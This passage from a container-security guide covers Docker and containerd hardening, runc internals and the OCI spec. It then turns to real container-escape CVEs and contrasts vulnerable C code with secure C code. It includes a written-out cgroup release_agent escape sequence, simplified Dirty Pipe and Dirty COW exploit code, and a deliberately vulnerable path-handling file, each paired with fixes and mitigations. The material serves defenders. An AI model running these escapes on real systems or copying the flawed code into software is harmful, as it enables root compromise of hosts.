  → Sets PR_SET_NO_NEW_PRIVS on all containers by default
  → Prevents setuid executables from gaining privileges
  → Prevents file capability escalation

"userns-remap": "default"
  → Enables user namespace remapping for all containers
  → Container root (uid 0) maps to unprivileged host user
  → If container escapes, attacker is unprivileged on host

"icc": false + "userland-proxy": false
  → icc=false: iptables DROP for inter-container on docker0 bridge
  → userland-proxy=false: use iptables REDIRECT, not docker-proxy process
  → docker-proxy is a Go process that proxies connections - removes attack surface

"live-restore": true
  → Containers continue running if dockerd restarts
  → Important for availability but doesn't affect security directly

"selinux-enabled": true
  → Enable SELinux label confinement for all containers
  → Only if host has SELinux (RHEL, Fedora, CentOS with SELinux)
```

### 8.4 Rootless Docker

Rootless Docker (stable since Docker 20.10) runs the entire Docker daemon as an unprivileged user:

```bash
# Install rootless Docker
dockerd-rootless-setuptool.sh install

# This creates:
# - ~/.config/docker/daemon.json (user-specific config)
# - ~/.local/share/docker/ (user-specific storage)
# - /run/user/1000/docker.sock (user-specific socket)

# Security properties:
# 1. dockerd runs as uid 1000, not root
# 2. Container root maps to host uid 1000 via user namespace
# 3. docker.sock owned by uid 1000, only this user can access it
# 4. Even if dockerd is compromised, attacker is uid 1000, not root

# Limitations:
# - Cannot use --network=host (requires CAP_NET_ADMIN)
# - Cannot use --privileged properly
# - Cannot mount some host paths
# - AppArmor profile may need adjustment

# Verify rootless:
docker info | grep -E "rootless|Context"
# "Rootless: true"
ps aux | grep dockerd
# uid=1000 ... /usr/bin/dockerd

# For Kubernetes rootless: use rootless containerd or rootless podman
```

---

## 9. containerd Architecture & Security Model

### 9.1 containerd Design

containerd is the industry-standard container runtime, used by Docker, Kubernetes (via CRI), and other platforms:

```
containerd Architecture:

┌──────────────────────────────────────────────────────────────────────┐
│                        containerd                                    │
│                                                                      │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │  gRPC API Server                                            │    │
│  │  /run/containerd/containerd.sock                            │    │
│  │  Services: Images, Containers, Tasks, Snapshots,            │    │
│  │            Content, Namespaces, Leases, Events              │    │
│  └──────────────────────┬──────────────────────────────────────┘    │
│                         │                                            │
│  ┌──────────┐  ┌────────▼─────────┐  ┌─────────────────────────┐   │
│  │ Metadata │  │  Task Manager    │  │    Plugin System        │   │
│  │ (boltdb) │  │  (lifecycle mgmt)│  │  Snapshotter plugins    │   │
│  └──────────┘  └────────┬─────────┘  │  Runtime plugins        │   │
│                         │            │  Content plugins         │   │
│  ┌──────────────────────▼──────┐     └─────────────────────────┘   │
│  │  Shim Manager               │                                    │
│  │  (per-container process)    │                                    │
│  └──────────────────────┬──────┘                                    │
└─────────────────────────┼────────────────────────────────────────────┘
                          │ (Unix domain socket per container)
              ┌───────────▼────────────┐
              │ containerd-shim-runc-v2 │  (per-container)
              │  - Manages runc        │
              │  - Keeps stdin/stdout  │
              │  - Forwards exit codes │
              └───────────┬────────────┘
                          │
              ┌───────────▼────────────┐
              │ runc                   │
              │  (OCI runtime - sets   │
              │   up container and     │
              │   exits)               │
              └───────────┬────────────┘
                          │
              ┌───────────▼────────────┐
              │ Container Process      │
              │  (your application)    │
              └────────────────────────┘
```

### 9.2 containerd gRPC API Security

```bash
# containerd socket permissions - critical security setting
ls -la /run/containerd/containerd.sock
# srw-rw---- root root -> Only root and containerd group can access

# In Kubernetes: kubelet communicates with containerd via this socket
# Any process with access to this socket can create containers!

# containerd namespaces (NOT Linux namespaces - containerd's own concept):
# Kubernetes uses "k8s.io" namespace
# Docker uses "moby" namespace
ctr --namespace k8s.io containers list
ctr --namespace moby containers list

# Check existing namespaces:
ctr namespaces list

# containerd config: /etc/containerd/config.toml
version = 2

[grpc]
  address = "/run/containerd/containerd.sock"
  uid = 0
  gid = 0

[plugins."io.containerd.grpc.v1.cri"]
  [plugins."io.containerd.grpc.v1.cri".containerd]
    default_runtime_name = "runc"
    [plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc]
      runtime_type = "io.containerd.runc.v2"
      [plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc.options]
        SystemdCgroup = true
        # Seccomp profile for ALL containers
        SeccompProfile = "/etc/containerd/seccomp-default.json"

  [plugins."io.containerd.grpc.v1.cri".image_decryption]
    key_model = "node"

  [plugins."io.containerd.grpc.v1.cri".registry]
    [plugins."io.containerd.grpc.v1.cri".registry.mirrors]
      [plugins."io.containerd.grpc.v1.cri".registry.mirrors."docker.io"]
        endpoint = ["https://mirror.gcr.io"]

[plugins."io.containerd.snapshotter.v1.overlayfs"]
  upperdir_label = true

# Enable image verification (containerd 1.7+)
[plugins."io.containerd.grpc.v1.cri".image_decryption]
  key_model = "node"
```

### 9.3 containerd Snapshotter Security

Snapshotters manage container layer storage:

```bash
# Storage drivers / snapshotters:
# overlayfs: most common, uses Linux overlay filesystem
# fuse-overlayfs: FUSE-based for rootless containers
# native: simple copy (slow, secure)
# devmapper: block-device based (good isolation, complex)
# zfs: ZFS-based (excellent isolation)
# btrfs: Btrfs-based (efficient)

# overlayfs security concerns:
# 1. Requires kernel support (CONFIG_OVERLAY_FS=y)
# 2. Upper/lower dir paths visible in /proc/mounts to other root processes
# 3. File capabilities preserved in overlay layers (if layer has setuid files)

# Check overlay mounts:
mount | grep overlay
# Type: overlay, options: lowerdir=...,upperdir=...,workdir=...

# Security: upperdir_label=true in containerd config
# Ensures SELinux labels are set on overlay upper directories
# Without this, SELinux-enabled systems may have label mismatches

# devmapper snapshotter: better isolation
# Each container layer = separate block device (thin provisioning)
# No shared kernel structures between containers (unlike overlay)
# But: more complex setup, requires LVM
cat /etc/containerd/config.toml
# [plugins."io.containerd.snapshotter.v1.devmapper"]
#   pool_name = "containerd-pool"
#   root_path = "/var/lib/containerd/io.containerd.snapshotter.v1.devmapper"
#   base_image_size = "10GB"
#   discard_blocks = true
```

### 9.4 OCI Image Security: Content Addressable Storage

```bash
# All container image layers are content-addressed (SHA256)
# This provides integrity guarantees: if digest matches, content is authentic

# containerd stores images in CAS:
# /var/lib/containerd/io.containerd.content.v1.content/blobs/sha256/

# Verify image integrity:
ctr --namespace k8s.io images check
# Reports digest mismatches

# Image pull with signature verification (using cosign):
cosign verify --key cosign.pub \
  registry.example.com/myapp:v1.0.0

# containerd image policy (OPA Gatekeeper integration):
# Enforce that only signed images from trusted registries can run

# Check image manifests:
ctr --namespace k8s.io content ls | head -20
# TYPE                                       DIGEST        SIZE
# application/vnd.oci.image.manifest.v1+json sha256:abc... 512B

# Pull with digest pinning (immune to tag mismatch attacks):
docker pull ubuntu@sha256:45b23dee08af5e43a7fea6c4cf9c25ccf269ee113168c19722f87876677c5cb2

# This is NOT the same as pulling by tag - tag can be changed,
# digest is immutable content address
```

---

## 10. OCI Specification & runc Internals

### 10.1 OCI Runtime Specification

The OCI Runtime Spec defines the container configuration format:

```json
/* config.json - OCI bundle configuration */
{
  "ociVersion": "1.0.2",
  "process": {
    "terminal": false,
    "user": {
      "uid": 1000,
      "gid": 1000,
      "additionalGids": []
    },
    "args": ["/usr/local/bin/myapp", "--port=8080"],
    "env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "HOSTNAME=mycontainer"
    ],
    "cwd": "/",
    "capabilities": {
      "bounding": ["CAP_NET_BIND_SERVICE"],
      "effective": ["CAP_NET_BIND_SERVICE"],
      "permitted": ["CAP_NET_BIND_SERVICE"],
      "inheritable": [],
      "ambient": []
    },
    "rlimits": [
      {"type": "RLIMIT_NOFILE", "hard": 1024, "soft": 1024},
      {"type": "RLIMIT_NPROC", "hard": 100, "soft": 100},
      {"type": "RLIMIT_MEMLOCK", "hard": 0, "soft": 0}
    ],
    "noNewPrivileges": true,
    "appArmorProfile": "my-container-profile",
    "selinuxLabel": "system_u:system_r:container_t:s0:c123,c456",
    "seccomp": {
      "defaultAction": "SCMP_ACT_ERRNO",
      "defaultErrnoRet": 38,
      "architectures": ["SCMP_ARCH_X86_64"],
      "syscalls": [
        {"names": ["read", "write", "close", "exit_group"],
         "action": "SCMP_ACT_ALLOW"}
      ]
    }
  },
  "root": {
    "path": "rootfs",
    "readonly": true
  },
  "hostname": "mycontainer",
  "mounts": [
    {
      "destination": "/proc",
      "type": "proc",
      "source": "proc",
      "options": ["nosuid", "noexec", "nodev"]
    },
    {
      "destination": "/dev",
      "type": "tmpfs",
      "source": "tmpfs",
      "options": ["nosuid", "strictatime", "mode=755", "size=65536k"]
    },
    {
      "destination": "/sys",
      "type": "sysfs",
      "source": "sysfs",
      "options": ["nosuid", "noexec", "nodev", "ro"]
    },
    {
      "destination": "/tmp",
      "type": "tmpfs",
      "source": "tmpfs",
      "options": ["nosuid", "nodev", "noexec", "size=100m"]
    }
  ],
  "linux": {
    "namespaces": [
      {"type": "pid"},
      {"type": "network"},
      {"type": "ipc"},
      {"type": "uts"},
      {"type": "mount"},
      {"type": "user"},
      {"type": "cgroup"}
    ],
    "uidMappings": [
      {"containerID": 0, "hostID": 100000, "size": 65536}
    ],
    "gidMappings": [
      {"containerID": 0, "hostID": 100000, "size": 65536}
    ],
    "resources": {
      "memory": {
        "limit": 268435456,
        "reservation": 134217728,
        "swap": 268435456,
        "swappiness": 0
      },
      "cpu": {
        "shares": 512,
        "quota": 50000,
        "period": 100000
      },
      "pids": {"limit": 100},
      "blockIO": {"weight": 500}
    },
    "maskedPaths": [
      "/proc/asound", "/proc/acpi", "/proc/kcore",
      "/proc/keys", "/proc/latency_stats", "/proc/timer_list",
      "/proc/timer_stats", "/proc/sched_debug", "/proc/scsi",
      "/sys/firmware"
    ],
    "readonlyPaths": [
      "/proc/bus", "/proc/fs", "/proc/irq", "/proc/sys",
      "/proc/sysrq-trigger"
    ],
    "seccomp": { "...": "..." }
  }
}
```

### 10.2 runc: The Container Lifecycle

runc implements the OCI runtime spec. Understanding its source is critical for security:

```
runc execution flow (from runc/libcontainer/):

runc create:
  1. Parse config.json (validate OCI spec)
  2. Create state directory /run/runc/<container-id>/
  3. Call libcontainer.Factory.Create()
  4. Fork process: runc parent + runc init (via clone with NS flags)
     ├── runc parent: writes uid/gid maps, signals child
     └── runc init:
         a. Apply mount namespace (pivot_root)
         b. Mount /proc, /sys, /dev with security options
         c. Apply UID/GID mappings
         d. Set hostname (UTS namespace)
         e. Drop capabilities (capset)
         f. Set NO_NEW_PRIVS
         g. Apply seccomp filter
         h. Apply AppArmor profile label (setexeccon for SELinux)
         i. Wait for "start" signal from parent
  
runc start:
  1. Send signal to runc init to proceed
  2. runc init calls execve() with container entrypoint
  3. Container process is now running

runc state:
  1. Read /run/runc/<container-id>/state.json
  2. Report running/stopped/paused state

runc delete:
  1. Send SIGKILL to container process
  2. Unmount container filesystem
  3. Clean up namespace file descriptors
  4. Remove state directory
  5. Remove cgroup (if managing cgroups)
```

**runc seccomp filter application order (critical):**

```c
/*
 * ORDER MATTERS: seccomp must be applied AFTER setuid/setgid changes
 * but it's complex - here's the correct order in runc:
 *
 * 1. Setup mounts (needs CAP_SYS_ADMIN for some mounts)
 * 2. Setup devices (needs CAP_MKNOD)
 * 3. Change UID/GID (setresuid/setresgid)
 * 4. Drop capabilities (capset - must happen AFTER uid/gid change)
 * 5. Set NO_NEW_PRIVS
 * 6. Apply AppArmor (write to /proc/self/attr/exec)
 * 7. Apply seccomp filter  ← MUST BE LAST (filter may block prctl/seccomp itself!)
 * 8. execve() ← container process starts
 *
 * If seccomp is applied too early, subsequent setup calls fail.
 * If it's applied too late, a window exists where the process has
 * more syscall access than intended.
 *
 * runc uses a two-phase approach:
 * Phase 1 (in runc init, before exec):
 *   - Apply seccomp with reduced set that allows remaining setup
 * Phase 2 (after full setup, before exec):
 *   - Apply final tight seccomp filter
 *   - execve() immediately after
 */

/* From runc/libcontainer/init_linux.go (conceptual): */
func containerInit(config *initConfig) error {
    // 1. Setup mounts
    if err := setupRootfs(config.Spec, config.NoNewKeyring); err != nil {
        return err
    }

    // 2. Finalize rootfs (pivot_root)
    if err := finalizeRootfs(config.Spec); err != nil {
        return err
    }

    // 3. Set hostname
    if config.Spec.Hostname != "" {
        if err := unix.Sethostname([]byte(config.Spec.Hostname)); err != nil {
            return err
        }
    }

    // 4. Set UID/GID (must be before capability drop)
    if err := setupUser(config); err != nil {
        return err
    }

    // 5. Close file descriptors (leak prevention)
    if err := utils.CloseExecFrom(config.PassedFilesCount + 3); err != nil {
        return err
    }

    // 6. Set NO_NEW_PRIVS
    if config.NoNewPrivileges {
        if err := unix.Prctl(unix.PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); err != nil {
            return err
        }
    }

    // 7. Set AppArmor label (writes to /proc/self/attr/exec)
    if config.AppArmorProfile != "" {
        if err := apparmor.ApplyProfile(config.AppArmorProfile); err != nil {
            return err
        }
    }

    // 8. Drop capabilities
    if err := finalizeCapabilities(config.Spec.Process.Capabilities); err != nil {
        return err
    }

    // 9. Apply seccomp LAST (before execve)
    if config.Spec.Linux.Seccomp != nil {
        if err := seccomp.InitSeccomp(config.Spec.Linux.Seccomp); err != nil {
            return err
        }
    }

    // 10. execve - the container process starts here
    return unix.Exec(config.Args[0], config.Args, os.Environ())
}
```

---

## 11. Real-World Container Escape CVEs

### 11.1 CVE-2019-5736: runc Container Escape (Critical)

**The most famous container escape**. Affected all runc-based runtimes (Docker, containerd, Kubernetes, LXC):

```
Vulnerability: runc executable overwrite via /proc/self/exe symlink

Attack Vector:
1. Attacker has code execution inside container
2. Attacker creates malicious container image with crafted /proc/self/exe
3. When runc attaches to the container (docker exec), runc opens
   /proc/self/exe to re-exec itself
4. /proc/self/exe in container namespace resolves to runc binary on host
5. Attacker exploits a race condition:
   - Opens /proc/self/exe via /proc/<runc-pid>/exe (file descriptor)
   - Waits for runc to open the container's /proc/self/exe  
   - Overwrites runc binary (which runc has open) with attacker payload
6. Next runc execution on host = attacker's code as root!

Technical details:
- runc re-execs itself for container setup (passing state via pipe)
- The re-exec opens /proc/self/exe to find its own path
- Inside the new PID namespace, /proc/self is the CONTAINER's /proc
- /proc/self/exe can be made to point to runc on the host filesystem
- Write access to /proc/<runc-pid>/exe via PTRACE_POKETEXT or similar
  is possible when runc opens a file descriptor to the container's root
```

```c
/*
 * CVE-2019-5736: Conceptual exploitation mechanism
 * EDUCATIONAL ONLY - Understanding the race condition
 */

/* The race:
 *
 * runc process (host) opens /proc/self/fd//runc
 * which resolves through container rootfs
 *
 * Attacker (in container):
 * while (!done) {
 *     // Try to open /proc/runc-pid/exe for writing
 *     // This only works during the brief window when runc
 *     // has the file open but hasn't exec'd yet
 *     int fd = open("/proc//exe", O_WRONLY);
 *     if (fd >= 0) {
 *         write(fd, evil_payload, sizeof(evil_payload));
 *         done = 1;
 *     }
 * }
 *
 * FIX (runc 1.0.0-rc7):
 * - Open the runc binary from the HOST path (outside container NS)
 *   before creating the container namespace
 * - Write a copy of runc to a tmpfile and exec THAT
 * - Never exec from a path accessible inside the container
 * - Use memfd_create() to create anonymous executable
 */

/* FIXED runc approach (simplified): */
int safe_runc_reexec(void) {
    /*
     * Read our own executable into a memfd BEFORE
     * entering container namespaces
     */
    int self_fd = open("/proc/self/exe", O_RDONLY | O_CLOEXEC);
    if (self_fd < 0) return -1;

    /* Create anonymous executable memory file */
    int mem_fd = memfd_create("runc", MFD_CLOEXEC | MFD_ALLOW_SEALING);
    if (mem_fd < 0) {
        close(self_fd);
        return -1;
    }

    /* Copy self to memfd */
    char buf[65536];
    ssize_t n;
    while ((n = read(self_fd, buf, sizeof(buf))) > 0) {
        if (write(mem_fd, buf, n) != n) {
            close(self_fd);
            close(mem_fd);
            return -1;
        }
    }
    close(self_fd);

    /* Seal the memfd - cannot be modified */
    fcntl(mem_fd, F_ADD_SEALS,
          F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE | F_SEAL_SEAL);

    /* The re-exec path is /proc/self/fd/
     * This is in the HOST /proc, not container /proc
     * Container cannot modify this memfd (sealed + different NS)
     */
    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", mem_fd);
    execv(fd_path, /* args */NULL);

    return -1; /* Not reached */
}
```

**Mitigation for CVE-2019-5736:**

```bash
# Patch: Update runc to >= 1.0.0-rc7 (February 2019)
runc --version  # Must be >= 1.0.0-rc7

# Detection: check if running vulnerable version
dpkg -l runc | grep runc
# Ubuntu/Debian:
apt-get update && apt-get upgrade runc

# Runtime mitigation (defense in depth):
# 1. seccomp: block ptrace, process_vm_write (makes race harder)
# 2. AppArmor/SELinux: prevent writes to /proc/PID/exe paths
# 3. User namespaces: container root isn't host root (makes some variants harder)
# 4. --no-new-privileges: limits some attack vectors

# AppArmor rule to mitigate:
# deny ptrace, deny @{PROC}/*/exe w, deny @{PROC}/*/mem w
```

### 11.2 CVE-2022-0492: cgroups v1 Container Escape

```bash
# Vulnerability: Privilege escalation via cgroup release_agent
# Requires: CAP_SYS_ADMIN OR ability to unshare user+cgroup namespaces
# Impact: container escape to host as root

# Conditions for exploitation:
# 1. Container has CAP_SYS_ADMIN (privileged or explicit cap-add)
#    OR can create new user namespace (unshare CLONE_NEWUSER)
# 2. cgroupsv1 is available and mountable
# 3. write access to release_agent file

# The attack (simplified):
# Inside container (with CAP_SYS_ADMIN or user NS):
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
# Or any cgroup subsystem that's available

mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# Find the host path of container rootfs (through /proc):
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Write exploit script to container filesystem
cat > /exploit.sh << 'EOF'
#!/bin/sh
ps aux > /output.txt  # Or any host command
EOF
chmod +x /exploit.sh

# Set release_agent to our script PATH on HOST filesystem
echo "$host_path/exploit.sh" > /tmp/cgrp/release_agent

# Trigger: put a process in the cgroup, then kill it
echo $$ > /tmp/cgrp/x/cgroup.procs
echo 0 > /tmp/cgrp/x/notify_on_release

# When the cgroup empties, kernel runs release_agent as ROOT on HOST!
# /exploit.sh runs with host root privileges

# MITIGATIONS:
# 1. Use cgroups v2 (no release_agent)
# 2. Block mount syscall via seccomp
# 3. Don't grant CAP_SYS_ADMIN
# 4. AppArmor: deny mount, deny /sys/fs/cgroup/** w
# 5. User namespace restrictions:
#    sysctl -w kernel.unprivileged_userns_clone=0 (Debian/Ubuntu)
#    OR
#    sysctl -w user.max_user_namespaces=0 (though this breaks rootless containers)
```

### 11.3 CVE-2021-30465: runc symlink Exchange Attack

```bash
# Vulnerability: Race condition in bind mount setup
# runc stat()'s target directory, then bind mounts source to it
# Race between stat() and mount() allows symlink to redirect mount

# Attack:
# 1. Container has two bind mounts configured in config.json
# 2. Attacker races to replace destination dir with symlink
#    pointing to sensitive host path BETWEEN runc's stat() and mount()
# 3. Mount target becomes host path (e.g., /etc)
# 4. Container can now write to /etc on host

# Fix: runc now uses openat2() with RESOLVE_NO_SYMLINKS flag
# Kernel 5.6+ openat2() syscall with strict resolution flags:
struct open_how how = {
    .flags = O_PATH | O_NOFOLLOW,
    .resolve = RESOLVE_NO_SYMLINKS | RESOLVE_NO_XDEV | RESOLVE_BENEATH,
};
int fd = syscall(__NR_openat2, AT_FDCWD, path, &how, sizeof(how));

# RESOLVE_BENEATH: path must remain within base directory
# RESOLVE_NO_SYMLINKS: never follow symlinks
# RESOLVE_NO_XDEV: don't cross filesystem boundaries

# This is why openat2() was added to the kernel (5.6):
# specifically to handle security-sensitive path resolution
```

### 11.4 CVE-2020-15257: containerd API Exposure (Host Network)

```bash
# Vulnerability: containerd's abstract unix domain socket accessible
# from container on host network (--network=host)

# The issue:
# containerd-shim-runc-v2 creates abstract Unix socket:
# @/containerd-shim///shim
# Abstract sockets are in the host's abstract namespace (not filesystem)
# Containers with --network=host share the host's network namespace
# Therefore they can see and connect to containerd's abstract socket!

# Impact: container can control containerd API, create new containers,
# potentially escape sandbox

# Detection:
# Inside container with host network:
ss -xlnp | grep containerd
# If shows abstract containerd-shim socket = vulnerable

# FIX (containerd 1.3.9, 1.4.3+):
# Changed to use path-based Unix sockets with proper permissions
# Path sockets are in mount namespace (not shared with --network=host)
# OR use abstract sockets with credential verification

# Mitigation:
# 1. Update containerd to >= 1.3.9 or >= 1.4.3
# 2. Don't use --network=host unless absolutely required
# 3. Use network namespace isolation (default Docker behavior)
```

### 11.5 CVE-2022-23648: containerd Path Traversal

```bash
# Vulnerability: Improper handling of image volume paths in config
# An image could specify volume paths with ".." sequences
# Leading to host path exposure when CRI is used with Kubernetes

# config.json image config Volumes field:
# "Volumes": {"../../etc": {}}  <- path traversal

# When containerd processes this, it could create volumes at
# traversed path, potentially exposing host filesystem paths

# Fix: containerd 1.6.1, 1.5.10
# Validate volume paths don't contain ".." before processing

# Detection: image scanning for malicious config
# Use tools like Trivy, Grype, or Syft to inspect image configs:
trivy image --security-checks config myimage:latest
```

### 11.6 Dirty Cow (CVE-2016-5195) in Containers

```c
/*
 * CVE-2016-5195: "Dirty Copy-On-Write" - Linux kernel race condition
 * Allows unprivileged user to write to read-only memory mappings
 * Worked from inside containers (shared kernel!)
 *
 * The attack from inside a container:
 * 1. mmap() a read-only file (e.g., /etc/passwd via volume mount)
 * 2. Use MADV_DONTNEED to cause TLB flush
 * 3. Race between copy-on-write mechanism and madvise MADV_DONTNEED
 * 4. Win the race to write to the "private" copy before COW
 * 5. Actually writes to the original file!
 *
 * Container-specific impact:
 * - If container has read-only bind mount to host files,
 *   dirty cow allows writing to those host files
 * - Can overwrite /etc/passwd on host!
 * - Works with uid=1000 in container (no root needed)
 *
 * Fixed: Linux kernel 4.8.3, 4.7.9, 4.4.26
 */

/* Conceptual dirty cow exploit - EDUCATIONAL: */
#include 
#include 
#include <sys/mman.h>
#include <sys/stat.h>
#include 

/* Race between these two operations: */
void *madvise_thread(void *arg) {
    char *addr = (char *)arg;
    struct stat st;
    /* MADV_DONTNEED: purges the private copy, forces re-read */
    /* This races with the write thread */
    while (1)
        madvise(addr, 100, MADV_DONTNEED);
    return NULL;
}

void *write_thread(void *arg) {
    char *addr = (char *)arg;
    /* /proc/self/mem allows writing to any mapped address */
    int f = open("/proc/self/mem", O_RDWR);
    while (1) {
        lseek(f, (off_t)addr, SEEK_SET);
        write(f, "EVIL", 4);  /* Write to "private" COW mapping */
        /* In the race window, this writes to the ORIGINAL file! */
    }
    return NULL;
}

/* MITIGATION: Keep kernel patched. Container doesn't help here. */
/* Defense in depth: read-only rootfs, read-only bind mounts for
   sensitive files, user namespaces to limit direct host file access */
```

### 11.7 CVE-2022-0847: Dirty Pipe (Pipes overwrite read-only files)

```c
/*
 * CVE-2022-0847: "Dirty Pipe" - write to read-only files via pipe splice
 * Linux kernels 5.8 - 5.16.11 / 5.15.25 / 5.10.102
 *
 * Mechanism:
 * - Linux pipe buffers have a "can merge" flag (PIPE_BUF_FLAG_CAN_MERGE)
 * - This flag allows new data to be merged into existing pipe pages
 * - splice() can add pages from a file to a pipe
 * - If the pipe buffer from splice() still has CAN_MERGE set,
 *   writing to the pipe OVERWRITES the FILE's page cache!
 *
 * Container impact:
 * - Works from inside a container (shared kernel page cache)
 * - Can overwrite read-only files that are in page cache
 * - Can overwrite SUID binaries (e.g., /usr/bin/passwd)
 *   even if container has read-only rootfs
 * - If SUID binary is overwritten, can gain container root
 * - From container root → then use other techniques to escape
 */

/* Proof of concept (simplified, educational): */
#include 
#include 
#include 
#include 
#include 

int dirty_pipe_write(const char *path, loff_t offset,
                     const char *data, size_t len) {
    int pfd[2];
    pipe(pfd);

    /* Fill pipe buffer to set PIPE_BUF_FLAG_CAN_MERGE on all pages */
    for (int i = 0; i < 16; i++) {
        write(pfd[1], "AAAA", 4);  /* Fill pipe pages */
    }

    /* Drain pipe but DON'T reset CAN_MERGE flag */
    char dummy[65536];
    read(pfd[0], dummy, sizeof(dummy));

    /* Open target file */
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;

    /* splice() adds file pages to pipe buffer
     * Pages inherit PIPE_BUF_FLAG_CAN_MERGE from pipe state! */
    loff_t off = offset - 1;  /* splice offset */
    splice(fd, &off, pfd[1], NULL, 1, 0);

    /* Now write to pipe - this merges into the file's page cache! */
    /* This is the vulnerability - we're writing to a read-only file! */
    write(pfd[1], data, len);

    close(fd);
    close(pfd[0]);
    close(pfd[1]);
    return 0;
}

/* FIX: Linux kernel patches cleared PIPE_BUF_FLAG_CAN_MERGE when
   allocating new pipe pages, preventing cross-file contamination */

/* CONTAINER MITIGATION:
 * 1. Patch kernel to >= 5.16.11 / 5.15.25 / 5.10.102
 * 2. Seccomp: cannot block splice() (too common) but can block
 *    specific flags combinations
 * 3. Read-only rootfs DOES NOT protect against this CVE
 *    (it modifies page cache, not filesystem)
 * 4. User namespaces: slightly limits impact (can't write to uid=0 files)
 *    but can still overwrite container-accessible files
 */
```

### 11.8 CVE-2023-2728 & CVE-2023-2727: Kubernetes Bypass

```bash
# CVE-2023-2728: ServiceAccount token volume projected credential bypass
# CVE-2023-2727: ImagePolicyWebhook bypass in Kubernetes

# CVE-2023-2727: Bypassing ImagePolicyWebhook admission controller
# Some Kubernetes versions allowed init containers to bypass image policy
# Init containers could use images that main containers couldn't

# Mitigation:
# - Update Kubernetes to 1.26.6+, 1.27.3+, 1.28.0+
# - ValidatingAdmissionWebhook that checks ALL container types
# - OPA Gatekeeper policies that cover initContainers too

# CVE-2023-2728: Bypass of projected ServiceAccount token check
# Allows pods without valid SA token to get tokens via volume projection
# Enabled information disclosure and potential impersonation

# Detection:
kubectl get pod -A -o json | jq '.items[] | 
  select(.spec.volumes[]?.projected.sources[]?.serviceAccountToken) |
  .metadata.name'

# Mitigation:
# - Update Kubernetes
# - BoundServiceAccountTokenVolume feature (enabled by default in 1.22+)
# - Rotate all ServiceAccount tokens after patch
```

---

## 12. Vulnerable vs Secure Code: C Implementations

### 12.1 Namespace Escape via /proc/self/fd

```c
/*
 * FILE: namespace_escape_vuln.c
 *
 * VULNERABILITY: Insecure file descriptor handling during container setup
 * allows escape from mount namespace via /proc/self/fd path traversal
 *
 * Pattern seen in older container runtimes and custom implementations
 */

#include 
#include 
#include 
#include 
#include <sys/types.h>
#include <sys/stat.h>
#include 

/* VULNERABLE: opens a path that resolves through container namespace */
int vulnerable_open_config(const char *container_root, const char *config_path) {
    char full_path[4096];
    /* BUG: Concatenating user-controlled container_root with config_path
     * without sanitizing. If config_path contains "../../../etc/passwd",
     * or if container_root is a symlink to a sensitive path,
     * this opens the wrong file */
    snprintf(full_path, sizeof(full_path), "%s/%s", container_root, config_path);

    /* BUG: open() follows symlinks by default
     * An attacker can make container_root/config_path a symlink
     * to a sensitive host file */
    return open(full_path, O_RDONLY);
}

/* VULNERABLE: Missing validation of pivot_root destination */
int vulnerable_pivot_root(const char *new_root) {
    /* BUG: No verification that new_root is a proper mount point
     * No check that new_root is not on a shared mount
     * No check for symlinks in new_root path */
    return syscall(SYS_pivot_root, new_root, "/old_root");
}
```

```c
/*
 * FILE: namespace_escape_secure.c
 *
 * SECURE: Proper file descriptor handling with openat2() and
 * strict path resolution to prevent namespace escape
 */

#define _GNU_SOURCE
#include 
#include 
#include 
#include 
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include 
#include 
#include <linux/openat2.h>

#ifndef __NR_openat2
#define __NR_openat2 437
#endif

/*
 * SECURE: Use openat2() with RESOLVE_BENEATH and RESOLVE_NO_SYMLINKS
 * This prevents any path from escaping the base directory
 */
int secure_open_beneath(int base_fd, const char *path, int flags) {
    struct open_how how = {
        .flags = flags | O_CLOEXEC,
        /* RESOLVE_BENEATH: path must stay within base_fd directory
         * RESOLVE_NO_SYMLINKS: never follow symlinks (prevents TOCTOU)
         * RESOLVE_NO_XDEV: don't cross mount points
         * RESOLVE_NO_MAGICLINKS: don't follow /proc/self/exe style links */
        .resolve = RESOLVE_BENEATH | RESOLVE_NO_SYMLINKS |
                   RESOLVE_NO_XDEV | RESOLVE_NO_MAGICLINKS,
    };

    long ret = syscall(__NR_openat2, base_fd, path, &how, sizeof(how));
    if (ret < 0) {
        errno = -ret;
        return -1;
    }
    return (int)ret;
}

/*
 * SECURE: Open container config using base directory fd
 * Cannot escape the container root even with malicious paths
 */
int secure_open_config(const char *container_root, const char *config_path) {
    /* Open the container root with O_PATH (no file content access,
     * just a directory handle) */
    int root_fd = open(container_root,
                       O_PATH | O_DIRECTORY | O_CLOEXEC | O_NOFOLLOW);
    if (root_fd < 0) {
        perror("open container_root");
        return -1;
    }

    /* Now open config relative to root_fd using openat2 with RESOLVE_BENEATH
     * Any path like "../../etc/passwd" will fail with EXDEV or ENOENT */
    int config_fd = secure_open_beneath(root_fd, config_path, O_RDONLY);
    if (config_fd < 0) {
        perror("secure_open_beneath config");
        close(root_fd);
        return -1;
    }

    close(root_fd);
    return config_fd;
}

/*
 * SECURE: Setup rootfs for container with comprehensive validation
 */
int secure_setup_rootfs(const char *new_root) {
    struct stat st;

    /* 1. Verify new_root exists and is a directory */
    if (lstat(new_root, &st) < 0) {  /* lstat: don't follow symlinks */
        perror("lstat new_root");
        return -1;
    }

    if (!S_ISDIR(st.st_mode)) {
        fprintf(stderr, "new_root is not a directory\n");
        return -1;
    }

    /* 2. Bind mount new_root onto itself to ensure it's a mount point */
    if (mount(new_root, new_root, NULL,
              MS_BIND | MS_REC | MS_PRIVATE, NULL) < 0) {
        perror("bind mount new_root");
        return -1;
    }

    /* 3. Change to new_root */
    if (chdir(new_root) < 0) {
        perror("chdir new_root");
        return -1;
    }

    /* 4. Create put_old directory for old root */
    if (mkdir(".pivot_root_old", 0700) < 0 && errno != EEXIST) {
        perror("mkdir .pivot_root_old");
        return -1;
    }

    /* 5. pivot_root: atomically changes root, can't be interrupted by race */
